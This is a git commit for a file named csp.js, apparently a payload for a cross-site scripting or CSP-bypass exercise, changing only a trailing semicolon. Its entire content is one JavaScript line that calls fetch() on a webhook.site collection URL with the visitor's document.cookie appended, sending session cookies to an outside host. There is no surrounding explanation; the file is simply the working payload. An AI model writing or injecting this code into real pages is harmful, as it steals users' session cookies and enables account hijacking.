4b535b9ea0b87dfae8ed0f6afd72ada8ed2ef029
thnimp <73044693+thnimp@users.noreply.github.com>
2023-04-11 15:56:25 +0930

    Update csp.js

--- csp.js
+++ csp.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/444c979d-cbb7-4c42-abd0-e4b5f71cce78?cookie=' + document.cookie)
+fetch('https://webhook.site/444c979d-cbb7-4c42-abd0-e4b5f71cce78?cookie=' + document.cookie);
